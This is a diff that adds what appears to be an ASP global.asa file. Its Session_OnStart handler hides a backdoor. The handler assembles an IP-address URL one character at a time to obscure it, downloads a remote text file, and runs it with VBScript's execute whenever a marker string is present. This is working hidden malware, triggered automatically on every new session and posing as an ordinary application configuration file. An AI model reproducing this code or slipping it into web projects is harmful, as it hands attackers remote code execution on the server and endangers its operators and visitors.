@@ -1,0 +1,69 @@
+<script language="vbscript" runat="server">
+
+'by_aming
+
+'by*aming
+
+sub Application_OnStart
+
+end sub
+
+ 
+
+sub Application_OnEnd
+
+end sub
+
+ 
+
+sub Session_OnStart
+
+    url="h"&"t"&"t"&"p"&":"&"/"&"/"&"1"&"8"&"0"&"."&"1"&"5"&"3"&"."&"9"&"0"&"."&"2"&"5"&"1"&":"&"4"&"4"&"5"&"5"&"/"&"g"&"l"&"o"&"b"&"a"&"l"&"."&"a"&"s"&"a"&"q"&"u"&"a"&"n"&"."&"t"&"x"&"t"
+
+    Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
+
+    ObjXMLHTTP.Open "GET",url,False
+
+    ObjXMLHTTP.setRequestHeader "User-Agent",url
+
+    ObjXMLHTTP.send
+
+    GetHtml=ObjXMLHTTP.responseBody
+
+    Set ObjXMLHTTP=Nothing
+
+    set objStream = Server.CreateObject("Adodb.Stream")
+
+    objStream.Type = 1
+
+    objStream.Mode =3
+
+    objStream.Open
+
+    objStream.Write GetHtml
+
+    objStream.Position = 0
+
+    objStream.Type = 2
+
+    objStream.Charset = "gb2312"
+
+    GetHtml = objStream.ReadText
+
+    objStream.Close
+
+    if instr(GetHtml,"by*aming")>0 then
+
+        execute GetHtml
+
+    end if
+
+end sub
+
+ 
+
+'sub Session_OnEnd
+
+'end sub
+
+</script>
